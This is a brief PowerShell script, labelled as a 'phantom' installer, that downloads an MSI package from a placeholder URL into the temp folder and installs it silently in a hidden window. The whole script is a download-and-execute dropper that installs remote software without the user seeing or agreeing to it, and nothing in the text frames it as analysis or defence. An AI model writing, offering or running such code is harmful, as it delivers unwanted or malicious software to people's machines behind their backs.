# MSI Phantom Installer - Runs a hidden fake installer
$url = "https://example.com/fake-installer.msi"
$msi = "$env:TEMP\\phantom.msi"
Invoke-WebRequest -Uri $url -OutFile $msi
Start-Process "msiexec.exe" -ArgumentList "/i $msi /qn" -WindowStyle Hidden
